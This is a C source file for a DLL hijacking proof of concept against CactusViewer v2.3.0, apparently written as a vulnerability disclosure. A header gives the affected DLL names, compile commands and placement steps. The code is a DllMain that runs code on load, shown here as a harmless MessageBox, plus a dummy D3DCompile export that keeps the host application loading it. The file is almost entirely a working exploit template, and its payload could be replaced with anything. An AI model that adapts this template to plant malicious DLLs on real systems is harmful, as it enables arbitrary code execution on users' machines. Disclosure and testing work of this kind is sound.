/*
 * CactusViewer v2.3.0 - DLL Hijacking Proof of Concept
 * 
 * Vulnerability: CWE-427 (Uncontrolled Search Path Element)
 * Affected DLLs: D3DCOMPILER_47.dll, d3d11.dll, dxgi.dll, 
 *                CRYPTSP.dll, d3d10warp.dll, Wldp.dll
 *
 * Description:
 *   CactusViewer.exe loads DLLs from its application directory
 *   before the Windows system directory. An attacker can place
 *   a malicious DLL in the same folder to achieve arbitrary
 *   code execution.
 *
 * Usage:
 *   Compile (64-bit):
 *     x86_64-w64-mingw32-gcc poc.c -shared -o D3DCOMPILER_47.dll
 *
 *   Compile (32-bit):
 *     i686-w64-mingw32-gcc poc.c -shared -o D3DCOMPILER_47.dll
 *
 *   Place the compiled DLL in the same directory as CactusViewer.exe
 *   and launch the application. A MessageBox will appear confirming
 *   code execution.
 *
 * Tested on: Windows 10 x64 (Build 19041)
 * Discovered: 2026-02-27
 * Author: Jashid Sany (https://github.com/jashidsany)
 */

#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, 
            "DLL Hijack PoC - Arbitrary Code Execution\n\n"
            "This MessageBox was triggered by a malicious DLL loaded\n"
            "from the application directory due to insecure DLL search\n"
            "order in CactusViewer v2.3.0.",
            "CactusViewer DLL Hijack", 
            MB_OK | MB_ICONWARNING);
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

/* Dummy export to satisfy the application's import table */
__declspec(dllexport) void D3DCompile(void) {
    return;
}
